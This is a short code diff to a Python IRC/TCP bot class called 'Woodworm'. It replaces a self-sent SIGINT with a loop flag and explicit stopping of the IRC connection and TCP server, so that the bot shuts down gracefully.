@@ -15,6 +15,7 @@ import signal
 
 class Woodworm:
     def __init__(self, config):
+        self.isLooped = True
         self.botnetDB = botnet_database.BotnetDatabase()
         self.pathToFiles = config['general']['pathToFiles']
         self.ircNick = config['irc']['nick']
@@ -69,7 +70,7 @@ class Woodworm:
             tcpThread.setDaemon(True)
             tcpThread.start()
 
-            while True:
+            while self.isLooped:
                 sleep(0.1)
 
         else:
@@ -239,7 +240,10 @@ class Woodworm:
         irc_connection.send_query(nickname, "Shutting down...")
         
         # TODO: Fix this to exit gracefully
-        os.kill(os.getpid(), signal.SIGINT)
+        self.irc_connection.stop()
+        self.tcp_server.stop()
+        sleep(1)
+        self.isLooped = False
 
 
     def downloader_onDownloadCompleted(self, *args, **kwargs):
